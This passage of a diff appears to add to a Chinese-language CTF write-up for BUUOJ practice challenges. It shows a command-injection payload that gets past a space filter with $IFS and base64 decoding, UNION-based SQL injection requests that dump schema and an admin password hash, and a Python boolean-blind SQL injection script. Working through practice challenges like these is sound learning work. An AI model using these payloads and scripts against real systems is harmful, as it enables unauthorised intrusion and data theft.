@@ -266,3 +266,74 @@ TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFw
 
 在根目录下找到/flag
 
+## Bash/Cmd
+### [命令注入](https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping)
+```sh 
+>>> base64.b64encode(b'flag.php').decode()
+'ZmxhZy5waHA='
+
+$ cat$IFS$9`echo$IFS$9ZmxhZy5waHA=|base64$IFS$9-d`
+```
+### [SQL注入](https://buuoj.cn/challenges#BUU%20SQL%20COURSE%201)
+使用BurpSuite抓包Repeater空格需要转义%0a -> space
+
+数据库
+```sh
+GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,group_concat(schema_name)%0afrom%0ainformation_schema.schemata;# HTTP/1.1
+
+{"title":"1","content":"information_schema,performance_schema,test,mysql,ctftraining,news"}
+```
+数据表
+```sh
+GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='ctftraining';# HTTP/1.1
+
+{"title":"1","content":"FLAG_TABLE,news,users"}
+```
+字段
+```sh
+GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema='ctftraining'%0aand%0atable_name='FLAG_TABLE';# HTTP/1.1
+
+{"title":"1","content":"FLAG_COLUMN"}
+```
+值
+```sh
+GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,FLAG_COLUMN%0afrom%0actftraining.FLAG_TABLE;# HTTP/1.1
+```
+但获取到的是空。。。改获取`users`表，用户名和密码登录失败。。。
+```sh
+GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='news';# HTTP/1.1
+
+{"title":"1","content":"admin,contents"}
+
+GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema='news'%0aand%0atable_name='admin';# HTTP/1.1
+
+{"title":"1","content":"id,username,password"}
+```
+最后拿到用户名admin密码`{"title":"1","content":"f22052f1061e5e21b134a749e84bdc1c"}`登录取得flag.
+
+### [SQL布尔盲注](https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World)
+
+```py
+import requests
+import time
+
+url = 'http://6bb7f5fc-177b-4897-80ab-a70f04d0ac47.node5.buuoj.cn:81/index.php'
+result = ''
+# uuid 36位 + flag{}
+for i in range(1, 44): 
+    # ascii 0～31：控制字符（不可见，如换行、退格等）
+    for j in range(32, 128):
+        time.sleep(0.1)
+        payload = '(ascii(substr((select(flag)from(flag)),' + str(i) + ',1))>' + str(j) + ')'
+        res = requests.post(url, data = {'id': payload})
+        # print('respond:', res, res.text)
+        if res.text.find('girl') == -1:
+            result += chr(j)
+            print(i, j, chr(j))
+            break
+print(result)
+```
+
+### [XSS](https://buuoj.cn/challenges#BUU%20XSS%20COURSE%201)
+
+
